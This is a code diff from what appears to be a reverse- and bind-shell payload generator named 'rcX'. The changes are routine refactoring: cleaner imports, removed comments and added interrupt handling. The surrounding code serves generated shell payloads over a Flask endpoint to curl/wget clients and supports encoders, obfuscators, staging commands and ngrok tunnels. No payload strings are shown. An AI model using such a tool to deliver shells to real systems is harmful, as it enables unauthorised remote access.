                     result += "<h5>" + str(i) + '.' + key + "</h5>" + "<div><pre>" + str(value) + "</pre></div>"
-                # result = '''<pre class="ng-binding">''' + result + "</pre>"
         else:
             if isinstance(text, dict):
                 i = 0
@@ -1872,7 +1810,7 @@ class Utils:
     def printTable(self, payloads=None):
         if isinstance(payloads, dict):
             try:
-                width = __import__('os').get_terminal_size().columns
+                width = os.get_terminal_size().columns
             except AttributeError:
                 width = 100
                 pass
@@ -1960,7 +1898,6 @@ class Utils:
 
 def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''):
     try:
-        import os
         from flask import request, Flask, send_file, send_from_directory
     except (Exception,) as e:
         print(e)
@@ -1971,7 +1908,7 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
             return response
 
     SERVER_NAME = 'rcX ' + __Version__
-    cli = __import__('sys').modules['flask.cli']
+    cli = sys.modules['flask.cli']
     cli.show_server_banner = lambda *x: None
     if template != 1:
         app = localFlask(__name__, static_folder=os.path.abspath(template), static_url_path="")
@@ -1983,8 +1920,6 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
     op = Utils()
 
     def web(_host, _port, shell_type, encoder, obfuscator, staging_url, staging_cmd):
-        # print("args", request.view_args)
-        # print("path", request.path, len(request.path[1:-1].split("/")))
         ua = ["curl", "wget", "fetch", "httpie", "lwp-request", "python-requests"]
         if any(x in request.headers["User-Agent"].lower() for x in ua):
             direction = "bind" if "bind" in request.path else "reverse"
@@ -1992,7 +1927,7 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
             payload = Generator(host=_host, port=_port, shell_type=shell_type, direction=direction,
                                 encoder=encoder, web=True, platform=platform, shell_path="", obfuscator=obfuscator,
                                 staging_url=staging_url, staging_cmd=staging_cmd)
-            result = op.title(payload[0]) + "\n" + op.format(payload[1])
+            result = op.format(payload[0], title=True) + "\n" + op.format(payload[1])
 
             return result
         else:
@@ -2111,7 +2046,6 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
         password = request.form.get("password")
         binary_name = request.form.get("binary_name")
         localtunnel = request.form.get("localtunnel")
-        # authtoken = request.form.get("authtoken")
         if request.host not in ["127.0.0.1", "localhost"]:
             localtunnel = ""
         if localtunnel == "ng_close":
@@ -2187,7 +2121,10 @@ def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken=''
 def main():
     args = cmdLineParser()
     if args.web:
-        create_app(args.web_host, args.web_port, args.web_debug, args.web, args.authtoken)
+        try:
+            create_app(args.web_host, args.web_port, args.web_debug, args.web, args.authtoken)
+        except KeyboardInterrupt:
+            sys.exit(0)
     else:
         payload = Generator(host=args.lhost, port=args.lport, shell_type=args.type, direction=args.direction,
                             protocol=args.protocol, encoder=args.encoder, password=args.password,
@@ -2206,6 +2143,7 @@ def main():
                 __import__('pyperclip').copy(list(payload[1].values())[args.clip - 1])
                 print("The payload has been copied to clipboard.")
             except IndexError:
+                print("index that does not exist!")
                 pass
 
         if args.tunnel:
@@ -2219,13 +2157,8 @@ def main():
             except IndexError:
                 print("ngrok tunnel start failed!")
             except KeyboardInterrupt:
-                __import__('sys').exit()
+                sys.exit(0)
 
 
 if __name__ == "__main__":
-    try:
-        __import__('sys').exit(main())
-    except KeyboardInterrupt:
-        pass
-    except (Exception,) as _:
-        print(_)
+    sys.exit(main())
